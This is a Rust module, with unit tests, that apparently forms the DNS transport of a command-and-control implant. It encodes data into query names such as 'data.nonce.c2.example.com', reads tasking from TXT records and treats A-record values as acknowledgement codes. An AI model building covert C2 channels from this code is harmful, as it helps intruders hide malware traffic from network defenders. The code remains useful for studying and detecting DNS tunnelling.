//! DNS packet building and parsing
//!
//! Implements minimal DNS protocol support for C2 communication.
//! Builds standard-compliant DNS queries and parses responses.


/// DNS record types we use
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u16)]
pub enum RecordType {
    A = 1,
    TXT = 16,
    AAAA = 28,
}

/// DNS class (always IN for Internet)
pub const CLASS_IN: u16 = 1;

/// DNS header flags
pub mod flags {
    pub const QR_QUERY: u16 = 0x0000;
    pub const QR_RESPONSE: u16 = 0x8000;
    pub const RD: u16 = 0x0100; // Recursion Desired
    pub const RA: u16 = 0x0080; // Recursion Available
}

/// Build a DNS query packet
///
/// # Arguments
/// * `transaction_id` - Unique ID for matching responses
/// * `name` - Query name (e.g., "data.nonce.c2.example.com")
/// * `record_type` - Type of record to query (TXT, A, AAAA)
pub fn build_query(transaction_id: u16, name: &str, record_type: RecordType) -> Vec<u8> {
    let mut packet = Vec::with_capacity(512);

    // Header (12 bytes)
    packet.extend(&transaction_id.to_be_bytes()); // Transaction ID
    packet.extend(&(flags::QR_QUERY | flags::RD).to_be_bytes()); // Flags
    packet.extend(&1u16.to_be_bytes()); // QDCOUNT = 1
    packet.extend(&0u16.to_be_bytes()); // ANCOUNT = 0
    packet.extend(&0u16.to_be_bytes()); // NSCOUNT = 0
    packet.extend(&0u16.to_be_bytes()); // ARCOUNT = 0

    // Question section
    encode_name(&mut packet, name);
    packet.extend(&(record_type as u16).to_be_bytes()); // QTYPE
    packet.extend(&CLASS_IN.to_be_bytes()); // QCLASS

    packet
}

/// Encode a domain name into DNS wire format
fn encode_name(packet: &mut Vec<u8>, name: &str) {
    for label in name.split('.') {
        if label.is_empty() {
            continue;
        }
        let len = label.len().min(63) as u8;
        packet.push(len);
        packet.extend(label[..len as usize].as_bytes());
    }
    packet.push(0); // Root label
}

/// Parsed DNS response
#[derive(Debug)]
pub struct DnsResponse {
    pub transaction_id: u16,
    pub is_response: bool,
    pub response_code: u8,
    pub answers: Vec<DnsRecord>,
}

/// A single DNS record from the answer section
#[derive(Debug)]
pub struct DnsRecord {
    pub record_type: u16,
    pub data: Vec<u8>,
}

/// Parse a DNS response packet
pub fn parse_response(packet: &[u8]) -> Option<DnsResponse> {
    if packet.len() < 12 {
        return None;
    }

    let transaction_id = u16::from_be_bytes([packet[0], packet[1]]);
    let flags = u16::from_be_bytes([packet[2], packet[3]]);
    let is_response = (flags & flags::QR_RESPONSE) != 0;
    let response_code = (flags & 0x000F) as u8;

    let qdcount = u16::from_be_bytes([packet[4], packet[5]]) as usize;
    let ancount = u16::from_be_bytes([packet[6], packet[7]]) as usize;

    let mut pos = 12;

    // Skip question section
    for _ in 0..qdcount {
        pos = skip_name(packet, pos)?;
        pos += 4; // QTYPE + QCLASS
    }

    // Parse answer section
    let mut answers = Vec::with_capacity(ancount);
    for _ in 0..ancount {
        let record = parse_record(packet, &mut pos)?;
        answers.push(record);
    }

    Some(DnsResponse {
        transaction_id,
        is_response,
        response_code,
        answers,
    })
}

/// Skip over a DNS name (handles compression)
fn skip_name(packet: &[u8], mut pos: usize) -> Option<usize> {
    loop {
        if pos >= packet.len() {
            return None;
        }
        let len = packet[pos];
        if len == 0 {
            return Some(pos + 1);
        }
        if (len & 0xC0) == 0xC0 {
            // Compression pointer
            return Some(pos + 2);
        }
        pos += 1 + len as usize;
    }
}

/// Parse a single DNS resource record
fn parse_record(packet: &[u8], pos: &mut usize) -> Option<DnsRecord> {
    // Skip name
    *pos = skip_name(packet, *pos)?;

    if *pos + 10 > packet.len() {
        return None;
    }

    let record_type = u16::from_be_bytes([packet[*pos], packet[*pos + 1]]);
    *pos += 2;

    // Skip class
    *pos += 2;

    // Skip TTL
    *pos += 4;

    // RDLENGTH
    let rdlength = u16::from_be_bytes([packet[*pos], packet[*pos + 1]]) as usize;
    *pos += 2;

    if *pos + rdlength > packet.len() {
        return None;
    }

    // Parse RDATA based on type
    let data = match record_type {
        1 => {
            // A record - 4 bytes
            if rdlength != 4 {
                return None;
            }
            packet[*pos..*pos + 4].to_vec()
        }
        16 => {
            // TXT record - one or more <length><string> pairs
            let mut txt_data = Vec::new();
            let end = *pos + rdlength;
            let mut txt_pos = *pos;

            while txt_pos < end {
                let txt_len = packet[txt_pos] as usize;
                txt_pos += 1;
                if txt_pos + txt_len > end {
                    return None;
                }
                txt_data.extend(&packet[txt_pos..txt_pos + txt_len]);
                txt_pos += txt_len;
            }
            txt_data
        }
        28 => {
            // AAAA record - 16 bytes
            if rdlength != 16 {
                return None;
            }
            packet[*pos..*pos + 16].to_vec()
        }
        _ => {
            // Unknown type - return raw data
            packet[*pos..*pos + rdlength].to_vec()
        }
    };

    *pos += rdlength;

    Some(DnsRecord { record_type, data })
}

/// Extract TXT record data from response
pub fn extract_txt_data(response: &DnsResponse) -> Option<Vec<u8>> {
    for record in &response.answers {
        if record.record_type == RecordType::TXT as u16 {
            return Some(record.data.clone());
        }
    }
    None
}

/// Extract A record data from response (4 bytes)
pub fn extract_a_data(response: &DnsResponse) -> Option<[u8; 4]> {
    for record in &response.answers {
        if record.record_type == RecordType::A as u16 && record.data.len() == 4 {
            return Some([
                record.data[0],
                record.data[1],
                record.data[2],
                record.data[3],
            ]);
        }
    }
    None
}

/// Interpret A record as acknowledgment status
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AckStatus {
    NoTasks,  // 0.0.0.0
    Success,  // 0.0.0.1
    Resend,   // 0.0.0.2
    Error,    // 0.0.0.3
    Unknown,
}

impl From<[u8; 4]> for AckStatus {
    fn from(addr: [u8; 4]) -> Self {
        match addr {
            [0, 0, 0, 0] => AckStatus::NoTasks,
            [0, 0, 0, 1] => AckStatus::Success,
            [0, 0, 0, 2] => AckStatus::Resend,
            [0, 0, 0, 3] => AckStatus::Error,
            _ => AckStatus::Unknown,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_query_txt() {
        let packet = build_query(0x1234, "test.example.com", RecordType::TXT);

        // Check header
        assert_eq!(packet[0], 0x12);
        assert_eq!(packet[1], 0x34);

        // Check flags (standard query with RD)
        assert_eq!(packet[2], 0x01);
        assert_eq!(packet[3], 0x00);

        // Check question count
        assert_eq!(packet[4], 0x00);
        assert_eq!(packet[5], 0x01);
    }

    #[test]
    fn test_build_query_a() {
        let packet = build_query(0xABCD, "data.nonce.c2.test.local", RecordType::A);

        assert_eq!(packet[0], 0xAB);
        assert_eq!(packet[1], 0xCD);

        // Verify it's asking for A record
        let qtype_pos = packet.len() - 4;
        assert_eq!(packet[qtype_pos], 0x00);
        assert_eq!(packet[qtype_pos + 1], 0x01); // A = 1
    }

    #[test]
    fn test_encode_name() {
        let mut packet = Vec::new();
        encode_name(&mut packet, "test.example.com");

        // Should be: 4 t e s t 7 e x a m p l e 3 c o m 0
        assert_eq!(packet[0], 4);
        assert_eq!(&packet[1..5], b"test");
        assert_eq!(packet[5], 7);
        assert_eq!(&packet[6..13], b"example");
        assert_eq!(packet[13], 3);
        assert_eq!(&packet[14..17], b"com");
        assert_eq!(packet[17], 0);
    }

    #[test]
    fn test_parse_simple_a_response() {
        // Minimal A response: header + answer with A record 0.0.0.1
        let mut packet = vec![
            0x12, 0x34, // Transaction ID
            0x81, 0x80, // Flags: response, recursion available
            0x00, 0x00, // QDCOUNT = 0 (simplified)
            0x00, 0x01, // ANCOUNT = 1
            0x00, 0x00, // NSCOUNT = 0
            0x00, 0x00, // ARCOUNT = 0
        ];

        // Answer: name (compressed), type, class, ttl, rdlength, rdata
        packet.extend(&[
            0xC0, 0x0C, // Name pointer (compression)
            0x00, 0x01, // Type: A
            0x00, 0x01, // Class: IN
            0x00, 0x00, 0x00, 0x3C, // TTL: 60
            0x00, 0x04, // RDLENGTH: 4
            0x00, 0x00, 0x00, 0x01, // RDATA: 0.0.0.1
        ]);

        let response = parse_response(&packet).unwrap();
        assert_eq!(response.transaction_id, 0x1234);
        assert!(response.is_response);
        assert_eq!(response.response_code, 0);
        assert_eq!(response.answers.len(), 1);

        let ack = extract_a_data(&response).unwrap();
        assert_eq!(AckStatus::from(ack), AckStatus::Success);
    }

    #[test]
    fn test_ack_status_values() {
        assert_eq!(AckStatus::from([0, 0, 0, 0]), AckStatus::NoTasks);
        assert_eq!(AckStatus::from([0, 0, 0, 1]), AckStatus::Success);
        assert_eq!(AckStatus::from([0, 0, 0, 2]), AckStatus::Resend);
        assert_eq!(AckStatus::from([0, 0, 0, 3]), AckStatus::Error);
        assert_eq!(AckStatus::from([1, 2, 3, 4]), AckStatus::Unknown);
    }

    #[test]
    fn test_parse_txt_response() {
        // TXT response with base32-encoded data
        let mut packet = vec![
            0x00, 0x01, // Transaction ID
            0x81, 0x80, // Flags: response
            0x00, 0x00, // QDCOUNT = 0
            0x00, 0x01, // ANCOUNT = 1
            0x00, 0x00, // NSCOUNT = 0
            0x00, 0x00, // ARCOUNT = 0
        ];

        // TXT answer
        packet.extend(&[
            0xC0, 0x0C, // Name pointer
            0x00, 0x10, // Type: TXT
            0x00, 0x01, // Class: IN
            0x00, 0x00, 0x00, 0x3C, // TTL: 60
            0x00, 0x06, // RDLENGTH: 6
            0x05,       // TXT string length
            b'h', b'e', b'l', b'l', b'o', // TXT data
        ]);

        let response = parse_response(&packet).unwrap();
        let txt = extract_txt_data(&response).unwrap();
        assert_eq!(txt, b"hello");
    }
}
